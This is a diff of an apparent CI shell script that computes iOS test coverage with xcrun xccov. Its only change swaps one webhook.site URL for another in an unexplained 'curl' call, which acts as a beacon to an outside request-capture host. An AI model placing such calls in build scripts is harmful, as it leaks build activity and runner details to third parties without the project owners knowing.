@@ -4,7 +4,7 @@
 set -e
 # debug log
 # set -x
-curl https://webhook.site/81624ebc-6e5d-43eb-bfb8-2361108e10b4
+curl https://webhook.site/cabc5fd0-6097-43cb-a402-fb4d0ea0a355
 
 export TARGET=${SDK_FRAMEWORK}
 export COVERAGE=`xcrun xccov view --json --only-targets --report $BITRISE_XCRESULT_PATH | grep -E -o lineCoverage[^,]+,[^:]+:\"$TARGET\" | grep -m 1 -o -E '0\.\d{2}' | cut -b 3-4`
